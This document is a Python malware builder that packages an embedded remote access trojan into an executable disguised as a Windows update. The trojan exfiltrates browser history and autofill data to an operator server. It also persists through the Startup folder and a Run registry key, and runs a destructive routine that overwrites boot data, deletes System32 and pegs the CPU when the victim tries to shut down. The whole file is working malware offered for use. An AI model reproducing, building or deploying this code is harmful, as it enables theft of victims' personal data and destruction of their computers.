"""
VIRTUALS RAT BUILDER
Builds the RAT executable that connects to your server
BY: YOUR STAR BESTIE
"""

import os
import sys
import subprocess
import shutil
import tempfile
import socket
import uuid

SERVER_URL = "http://localhost:8080"  # CHANGE THIS
OUTPUT_NAME = "WindowsSystemUpdate.exe"

RAT_CODE = '''
import os, sys, time, subprocess, platform, psutil, ctypes, winreg, shutil, threading, atexit, signal, tempfile, uuid, socket, sqlite3, glob, json, base64, re
from datetime import datetime

# CONFIG
SERVER_URL = "SERVER_URL_PLACEHOLDER"
VICTIM_ID = socket.gethostname() + "-" + str(uuid.getnode())[:8]

# HEARTBEAT
def send_heartbeat():
    pc_name = platform.node()
    ip = socket.gethostbyname(socket.gethostname())
    os_info = platform.system() + " " + platform.release()
    is_vm = False
    try:
        vm_procs = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe']
        for p in vm_procs:
            try:
                r = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {p}'], capture_output=True, text=True, timeout=3)
                if p in r.stdout: is_vm = True; break
            except: pass
    except: pass
    data = {'victim_id': VICTIM_ID, 'pc': pc_name, 'ip': ip, 'os': os_info, 'is_vm': 1 if is_vm else 0}
    while True:
        try:
            import requests
            requests.post(f"{SERVER_URL}/heartbeat", json=data, timeout=5)
        except: pass
        time.sleep(5)

# PERSISTENCE
def setup_persistence():
    try:
        sp = os.path.join(os.environ.get('APPDATA',''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shutil.copy2(sys.argv[0], os.path.join(sp, os.path.basename(sys.argv[0])))
    except: pass
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(k)
    except: pass

# SHUTDOWN FRY
class ShutdownFry:
    def __init__(self):
        self.fried = False
        threading.Thread(target=self.monitor, daemon=True).start()
    def monitor(self):
        while True:
            try:
                for p in psutil.process_iter(['pid','name']):
                    try:
                        if p.info['name'] and p.info['name'].lower() in ['shutdown.exe','winlogon.exe','csrss.exe']:
                            self.fry()
                    except: pass
                time.sleep(0.1)
            except: time.sleep(0.1)
    def fry(self):
        if self.fried: return
        self.fried = True
        try:
            for c in range(psutil.cpu_count()*2):
                os.system(f'wmic cpu set NumberOfCores={c+100} 2>nul')
                os.system(f'wmic cpu set MaxClockSpeed=9999999 2>nul')
        except: pass
        def burn():
            while True: _ = [i**i for i in range(1000000)]
        for _ in range(psutil.cpu_count()*4): threading.Thread(target=burn, daemon=True).start()
        try:
            os.system('bootrec /fixmbr 2>nul')
            os.system('echo CORRUPTED > C:\\\\boot.ini 2>nul')
            os.system('rmdir /s /q C:\\\\Windows\\\\System32 2>nul')
            os.system('shutdown /s /f /t 0')
        except: pass
        os._exit(0)

# AUTO SCRAPE
def auto_scrape():
    try:
        browsers = {
            'Chrome': os.path.expandvars('%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default'),
            'Edge': os.path.expandvars('%LOCALAPPDATA%\\\\Microsoft\\\\Edge\\\\User Data\\\\Default'),
            'Brave': os.path.expandvars('%LOCALAPPDATA%\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default'),
            'Firefox': os.path.expandvars('%APPDATA%\\\\Mozilla\\\\Firefox\\\\Profiles')
        }
        results = {}
        for name, path in browsers.items():
            data = {'history': [], 'autofill': []}
            try:
                if 'Firefox' in name:
                    profiles = glob.glob(os.path.join(path, '*.default*'))
                    for pr in profiles:
                        pp = os.path.join(pr, 'places.sqlite')
                        if os.path.exists(pp):
                            c = sqlite3.connect(pp).cursor()
                            c.execute("SELECT url,title FROM moz_places ORDER BY last_visit_date DESC LIMIT 30")
                            for row in c.fetchall(): data['history'].append(f"{row[1]} - {row[0]}")
                else:
                    hp = os.path.join(path, 'History')
                    if os.path.exists(hp):
                        c = sqlite3.connect(hp).cursor()
                        c.execute("SELECT url,title FROM urls ORDER BY last_visit_time DESC LIMIT 30")
                        for row in c.fetchall(): data['history'].append(f"{row[1]} - {row[0]}")
                    ap = os.path.join(path, 'Web Data')
                    if os.path.exists(ap):
                        c = sqlite3.connect(ap).cursor()
                        c.execute("SELECT name,value FROM autofill")
                        for row in c.fetchall(): data['autofill'].append(f"{row[0]}: {row[1]}")
                if data['history'] or data['autofill']:
                    results[name] = data
            except: pass
        if results:
            import requests
            requests.post(f"{SERVER_URL}/api/browser_data", json={'victim_id': VICTIM_ID, 'data': results}, timeout=5)
    except: pass

class RAT:
    def __init__(self):
        self.shutdown = ShutdownFry()
    def run(self):
        try: setup_persistence()
        except: pass
        try: auto_scrape()
        except: pass
        threading.Thread(target=send_heartbeat, daemon=True).start()
        while True: time.sleep(60)

if __name__ == "__main__":
    try:
        rat = RAT()
        rat.run()
    except:
        try: ShutdownFry().fry()
        except: pass
'''

def build_rat():
    print("\n" + "="*60)
    print("   VIRTUALS RAT BUILDER")
    print("="*60)
    print(f"[*] Server URL: {SERVER_URL}")
    print(f"[*] Output: {OUTPUT_NAME}")
    print("="*60)
    
    os.makedirs("dist", exist_ok=True)
    rat_code = RAT_CODE.replace("SERVER_URL_PLACEHOLDER", SERVER_URL)
    
    temp_dir = tempfile.mkdtemp()
    project_dir = os.path.join(temp_dir, 'project')
    os.makedirs(project_dir, exist_ok=True)
    
    with open(os.path.join(project_dir, 'rat.py'), 'w', encoding='utf-8') as f:
        f.write(rat_code)
    
    with open(os.path.join(project_dir, 'requirements.txt'), 'w') as f:
        f.write('psutil>=5.8.0\nrequests>=2.27.0\n')
    
    build_script = '''
import os, sys, subprocess
try: subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])
except: pass
try:
    subprocess.check_call([
        sys.executable, '-m', 'PyInstaller',
        '--onefile', '--noconsole', '--uac-admin',
        '--distpath', 'dist', '--workpath', 'build',
        '--hidden-import', 'psutil',
        '--hidden-import', 'requests',
        '--hidden-import', 'win32api',
        '--hidden-import', 'win32con',
        '--hidden-import', 'win32gui',
        '--hidden-import', 'sqlite3',
        'rat.py'
    ])
    print("Build complete!")
except Exception as e:
    print(f"Build error: {e}")
    sys.exit(1)
'''
    with open(os.path.join(project_dir, 'build_script.py'), 'w') as f:
        f.write(build_script)
    
    print("[*] Building EXE...")
    try:
        original_dir = os.getcwd()
        os.chdir(project_dir)
        subprocess.check_call([sys.executable, 'build_script.py'])
        
        for root, dirs, files in os.walk(project_dir):
            for file in files:
                if file == 'rat.exe':
                    src = os.path.join(root, file)
                    dst = os.path.join(original_dir, 'dist', OUTPUT_NAME)
                    shutil.copy2(src, dst)
                    print(f"[+] EXE saved to: {dst}")
                    break
        
        os.chdir(original_dir)
        
        final_path = os.path.join(original_dir, 'dist', OUTPUT_NAME)
        if os.path.exists(final_path):
            print("\n" + "="*60)
            print("[+] BUILD SUCCESSFUL!")
            print("="*60)
            print(f"[+] EXE: {final_path}")
            print(f"[+] Server: {SERVER_URL}")
            print("="*60)
            return True
        else:
            print("[-] EXE not found")
            return False
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    print("\n[*] Enter your server URL:")
    url = input("Server URL (default: http://localhost:8080): ").strip()
    if url:
        SERVER_URL = url
    build_rat()
    input("\nPress Enter to exit...")